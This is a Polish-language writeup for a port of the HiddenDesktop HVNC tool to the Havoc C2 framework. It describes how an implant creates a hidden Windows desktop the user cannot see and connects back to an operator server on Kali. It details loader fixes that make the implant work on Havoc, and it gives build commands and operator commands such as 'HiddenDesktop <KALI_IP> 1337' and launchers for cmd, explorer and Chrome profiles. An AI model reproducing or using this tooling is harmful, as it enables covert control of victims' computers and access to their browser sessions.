# Writeup — havoc-hiddendesktop

Hidden Desktop (HVNC) to nie RDP i nie VNC. Implant robi `CreateDesktop` / `SetThreadDesktop` na **osobnym WinStation desktopie**. Procesy tam nie widać na konsoli użytkownika. Operator dostaje drugie okno (u nas `HVNC Server.exe` pod Wine na Kali), a BOF na Demonie: mysz/klawiatura + zrzuty okien (`PrintWindow`).

Oryginał: [WKL-Sec/HiddenDesktop](https://github.com/WKL-Sec/HiddenDesktop) (2023, Beacon/CS). Koncepcja top, **loader pod Havoca nie działa**. To repo to działający port + łatki z labu.

## Architektura

```
[Kali] wine "HVNC Server.exe"  ←── TCP :1337 (direct) ──  [Win] HiddenDesktop BOF
        okno Operator UI                                      CreateDesktop
                                                              hd-launch-*
```

Implant **zawsze** łączy `connect(operator_ip, port)`. Dwa sockety: `input` (sterowanie) i `desktop` (piksele). Serwer paruje je po **adresie źródłowym** (uhid = IPv4).

Havoc `rportfwd` **nie** nadaje się do tego protokołu.

## Co było spalone w oryginale na Havocu

### 1. `Symbol not found: BofMain`

BOF CS to `ld -r`: mały `go()` + blob PIC podpisany `BofMain`. CoffeeLdr w Demonie rozwiązuje **tylko** `__imp_*` i reloki sekcji. Lokalna funkcja typu `0x20` o nazwie `BofMain` leci w `SymbolNotFound`.

**Fix:** jeden obiekt; blob `incbin` w `.text`; `lea` RIP (bez `.refptr`); kopia do `VirtualAlloc`, dopiero `call`.

### 2. Demon umiera po komendzie

`jmp` w PIC / odpalenie bloba **z mapy CoffeeLdra**: pętla HVNC nigdy nie wraca, albo AV w złym reloc. Cleanup Coffee zwalnia obraz, wątek HVNC czyta UAF.

**Fix:** `KERNEL32$VirtualAlloc` + `memcpy` + `call` kopii. Coffee może unmapować BOF, PIC żyje na heap/RX.

### 3. `HD thread` nigdy nie wstaje

CS: `BeaconInjectProcess` wstrzykuje `InputHandler` w PID Demona. Havoc: `NtCreateThreadEx` z **NULL** handle → cisza, `BOF execution completed`, zero `connect()`.

**Fix:** `VirtualAlloc` payloadu + `CreateThread`.

### 4. Pipe (CS job 40)

`InputHandler` robi `CreateNamedPipe` + `ConnectNamedPipe` i **czeka** aż Beacon podepnie job (command 40 w Aggressorze). Havoc tego nie ma → wątek wisi, do HVNC nie wchodzi.

**Fix:** skip `PipeWait`.

### 5. `rportfwd` — wygląda jak tunel, nie jest streamem

Demon binduje `127.0.0.1:<rport>`, teamserver po pierwszym `WRITE` z implantu robi `Dial` na operatora. Odczyt z operatora: `io.Copy` **do EOF**. ACK (`SendInt 0`) i kolejne ramki z serwera **nigdy** nie wracają, dopóki Wine nie zamknie gniazda.

Skutek: okno „connected”, **jeden** TCP, brak kanału `desktop`, czarny operator.

**Fix:** zero `rportfwd`. `HiddenDesktop <KALI_IP> 1337` = `connect()` z Windowsa na Kali.

### 6. Drugi raz z tego samego hosta = drop

Serwer: `uhid = peer IPv4`. `input` z IP, które już ma slot → `closesocket` i return. Retry z labu zabija sesję (`CLOSE-WAIT`).

**Fix:** reconnect **resetuje** slot (stare sockety/HWND), nie dropuje.

### 7. Launchery

- `CreateProcessA("notepad", …)` bez PATH → fail. `SearchPathA` + linia poleceń.
- `calc.exe` na Win10 to stub UWP → **widoczny pulpit**. BOF odmawia; `mspaint` / `notepad` / `write`.
- `hd-launch-firefox` z `SHFileOperation` całego profilu w procesie Demona → lock/crash. Pusty `-profile` + `-no-remote`.

## Instalacja (skrót)

Zobacz [README.md](README.md). Esencja:

```bash
sudo apt install -y mingw-w64 nasm python3 python3-tk wine64
make x64 && make server
python3 scripts/hd-server.py        # probes wine64 + HVNC exe, START → :1337
# CLI: ./scripts/hd-listen.sh
# Havoc: Load Script bin/hidden-desktop.py
# Demon Admin (nie SYSTEM):
HiddenDesktop <KALI_IP> 1337
hd-launch-cmd
hd-launch-explorer
```

Firewall: Kali INPUT tcp/1337; Windows outbound 1337. Sesja interaktywna (konsola), nie session 0.

## Operacja

Nie reloaduj `hidden-desktop.py` w trakcie sesji (nazwa desktopu jest w RAM loadera).  
Nie odpalaj HVNC z SYSTEM.  
Chrome (`hd-launch-chrome`) kopiuje User Data — ciężkie.  
Dwa `[+] New Connection` / Reconnect w Wine = input + desktop; wtedy Quality → High.

## Credit

WKL-Sec HiddenDesktop (MIT, 2023), TinyNuke, Meltedd/HVNC. Port Havoc + łatki: DonMorpheus (2026).
